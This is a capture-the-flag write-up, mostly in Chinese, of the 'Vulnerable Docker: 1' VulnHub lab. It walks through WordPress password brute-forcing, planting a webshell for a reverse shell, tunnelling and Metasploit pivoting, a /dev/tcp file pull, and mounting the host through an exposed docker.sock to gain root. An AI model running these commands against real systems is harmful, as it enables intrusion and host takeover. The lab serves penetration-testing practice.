# Vulnerable Docker: 1

2024-8-x https://www.vulnhub.com/entry/vulnerable-docker-1,208/

difficulty: begginer-intermediate

## IP

192.168.5.37

## Scan

Open Port -> 22,8000

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6p1 Ubuntu 2ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 45130881706d46c350ed3cabaed6e185 (DSA)
|   2048 4ce72b0152161d5c6b099d3d4bbb7990 (RSA)
|   256 cc2f62714cea6ca6d8a74feb822a22ba (ECDSA)
|_  256 73bfb4d6ad51e3992629b742e3ffc381 (ED25519)
8000/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-open-proxy: Proxy might be redirecting requests
| http-robots.txt: 1 disallowed entry
|_/wp-admin/
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-title: NotSoEasy Docker &#8211; Just another WordPress site
|_http-generator: WordPress 4.8.1
```

直接看 8000 的 web 端口，是一个 wordpress 网站，wpscan 进行扫描，找到用户：

```
wpscan --url http://192.168.5.37:8000/ -e u
```

发现用户 bob 尝试对此用户爆破登陆，最终发现密码为 Welcome1 登陆 wp 后台，在 Theme Editor 中写入 webshell，并在 kali 上得到反弹的 shell。

```
nc -lvnp 8888
curl http://192.168.5.37:8000/wp-content/themes/twentyseventeen/404.php
```

登陆 wordpress 后，在首页上发现了第 1 个 flag: http://192.168.5.37:8000/wp-admin/post.php?post=43&action=edit

```
2aa11783d05b6a329ffc4d2a1ce037f46162253e55d53764a6a7e998

good job finding this one. Now Lets hunt for the other flags

hint: they are in files.
```

进入系统后，先升级下 tty。经过枚举，发现这是一个 docker 容器。

ip a s 发现了另外的一个网段 172.18.0.3 ，将 nmap 静态文件上传是目标机器对 172.18.0.0 网段进行扫描。发现存活的主机 ip 为 172.18.0.1 至 172.18.0.4

```
172.18.0.1
PORT     STATE SERVICE
22/tcp   open  ssh
8000/tcp open  unknown

172.18.0.2
PORT     STATE SERVICE
3306/tcp open  mysql

172.16.0.3
PORT   STATE SERVICE
80/tcp open  http

172.18.0.4
PORT     STATE SERVICE
22/tcp   open  ssh
8022/tcp open  unknown
```

先创建动态端口转发方便后面的信息收集，使用 neoreg，将 tunnel.php 上传至 /var/www/html 文件夹中，在 kali 上启动 tunnel:

```
python3 neoreg.py -k thm -u http://192.168.5.37:8000/tunnel.php
```

然后配置 proxychains 并启动 firefox，访问 http://172.18.0.4:8022/ 就能看到 shell 的执行窗口。或者是用 msf 中的 autoroute 模块和 server_proxy 进行代理创建也可以达到同样的效果。

```
# 先获得一个meterpreter_reverse 的shell
ipconfig
run post/multi/manage/autoroute  或 run autoroute -s 172.18.0.0/16   run autoroute -p 或 route add 172.18.0.0 255.255.0.0 2
bg
route print
use auxiliary/scanner/portscan/tcp  # 进行存活主机IP扫描

# 利用msf的代理暴露给kali代理(kali上会创建一个1080的tcp监听，可以在proxychainis中使用)
use auxiliary/server/socks_proxy
run
```

msf 中的端口转发(可以直接在 kali 的浏览器上访问 127.0.0.1:1234 不用加代理，但是这需要提前知道这个端口是目标端口才行)：

```
# 将在本地127.0.0.1:1234上的访问转发至远程IP 172.18.0.4 的 8022 端口
meterpreter> portfwd add -l 1234 -r 172.18.0.4 -p 8022
```

http://172.18.0.4:8022/ 进入了另外一个 docker 容器，当前容器的用户是 root。发现 /run/docker.sock , 可以利用这个文件把宿主机挂载起来。

先下载 docker 静态文件到这个 docker 容器中，这时才能利用 docker 程序与宿主机进行通信:

kali 上执行：

```
nc -lvnp -q 5 3333 < docker-17.03.0-ce.tgz
```

docker 容器中执行：

```
cat < /dev/tcp/192.168.5.3/3333 > docker-17.03.0-ce.tgz
tar -zxvf docker-17.03.0-ce.tgz
```

同时知道宿主机上有 wordpress 的 image，可以直接进行利用。

```
cd docker
./docker -H unix:///run/docker.sock info

# 查看宿主机上的image
./docker -H unix:///run/docker.sock images

REPOSITORY                 TAG                 IMAGE ID            CREATED             SIZE
wordpress                  latest              c4260b289fc7        6 years ago         406 MB
mysql                      5.7                 c73c7527c03a        7 years ago         412 MB
jeroenpeeters/docker-ssh   latest              7d3ecb48134e        7 years ago         43.2 MB

./docker -H unix:///run/docker.sock run -v /:/mnt --rm -it wordpress chroot /mnt sh
```

得到第 3 个 flag:

```
# cat flag_3
d867a73c70770e73b65e6949dd074285dfdee80a8db333a7528390f6

Awesome so you reached host

Well done

Now the bigger challenge try to understand and fix the bugs.

If you want more attack targets look at the shadow file and try cracking passwords :P

Thanks for playing the challenges we hope you enjoyed all levels

You can send your suggestions bricks bats criticism or appreciations
on vulndocker@notsosecure.com
```

最后生成 id_rsa.pub 公钥，并写到/root/.ssh 文件夹中，这样就可以用 ssh 登陆到目标主机了。
